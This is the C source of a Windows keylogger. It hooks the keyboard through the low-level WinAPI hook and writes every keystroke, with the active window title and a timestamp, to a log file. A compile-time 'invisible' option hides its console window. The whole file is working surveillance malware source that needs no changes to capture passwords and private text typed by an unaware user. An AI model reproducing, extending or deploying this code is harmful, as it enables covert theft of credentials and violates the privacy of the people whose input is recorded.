#include <time.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winuser.h>


#define visible

HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
FILE *OUTPUT_FILE;

char lastwindow[256];

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {\
        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
        Save(kbdStruct.vkCode);
    }

    return CallNextHookEx(_hook, nCode, wParam, lParam);
}


void SetHook() 
{
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
    }
}


void ReleaseHook()
{
    UnhookWindowsHookEx(_hook); 
}


int Save(int key_stroke)
{
    char lastwindow[256];
    if ((key_stroke == 1) || (key_stroke == 2)) return 0;

    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout;

    if (foreground) 
    {
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowText(foreground, window_title, sizeof(window_title));

        if (strcmp(window_title, lastwindow) != 0)
        {
            strcpy(lastwindow, window_title);

            time_t t = time(NULL);
            struct tm *tm = localtime(&t);
            char s[64];
            strftime(s, sizeof(s), "%c", tm);

            fprintf(OUTPUT_FILE, "\n\n[Window: %s - at %s] ", window_title, s);
        }
    }

    printf("%d\n", key_stroke);

    if (key_stroke == VK_BACK)
        fprintf(OUTPUT_FILE, "[BACKSPACE]");
    else if (key_stroke == VK_RETURN)
        fprintf(OUTPUT_FILE, "\n");
    else if (key_stroke == VK_SPACE)
        fprintf(OUTPUT_FILE, " ");
    else if (key_stroke == VK_TAB)
        fprintf(OUTPUT_FILE, "[TAB]");
    else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
        fprintf(OUTPUT_FILE, "[SHIFT]");
    else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
        fprintf(OUTPUT_FILE, "[CONTROL]");
    else if (key_stroke == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "[ESCAPE]");
    else if (key_stroke == VK_END)
        fprintf(OUTPUT_FILE, "[END]");
    else if (key_stroke == VK_HOME)
        fprintf(OUTPUT_FILE, "[HOME]");
    else if (key_stroke == VK_LEFT)
        fprintf(OUTPUT_FILE, "[LEFT]");
    else if (key_stroke == VK_UP)
        fprintf(OUTPUT_FILE, "[UP]");
    else if (key_stroke == VK_RIGHT)
        fprintf(OUTPUT_FILE, "[RIGHT]");
    else if (key_stroke == VK_DOWN)
        fprintf(OUTPUT_FILE, "[DOWN]");
    else if (key_stroke == 190 || key_stroke == 110)
        fprintf(OUTPUT_FILE, ".");
    else if (key_stroke == 189 || key_stroke == 109)
        fprintf(OUTPUT_FILE, "-");
    else if (key_stroke == 20)
        fprintf(OUTPUT_FILE, "[CAPSLOCK]");
    else 
    {
        char key;
        boolean lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        if (
            (GetKeyState(VK_SHIFT)  & 0x1000) != 0 ||
            (GetKeyState(VK_LSHIFT) & 0x1000) != 0 ||
            (GetKeyState(VK_RSHIFT) & 0x1000) != 0
        ) lowercase = !lowercase;

        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
        if (!lowercase) key = tolower(key);

        fprintf(OUTPUT_FILE, "%c", key);
    }
 
    fflush(OUTPUT_FILE);
    return 0;
}

void Stealth() {
    #ifdef visible
        ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
    #endif

    #ifdef invisible
        ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
    #endif
}

int main(int argc, char* argv[]) {
    const boolean help = (
        !strcmp(argv[1], "-h") ||
        !strcmp(argv[1], "--help")
    );

    const boolean out_log = (  
        !strcmp(argv[1], "-o") ||
        !strcmp(argv[1], "--out-log")
    );

    if ((boolean) help || (boolean) !out_log) printf(
        "example: kylg_winapi [-o | --out-log] [LOG FILE]\n");

    const char* log_file;
    if ((boolean) out_log) log_file = argv[2];
    else return 0;

    OUTPUT_FILE = fopen(log_file, "a");

    Stealth(); SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {}

    fclose(OUTPUT_FILE);
    return 0;
}
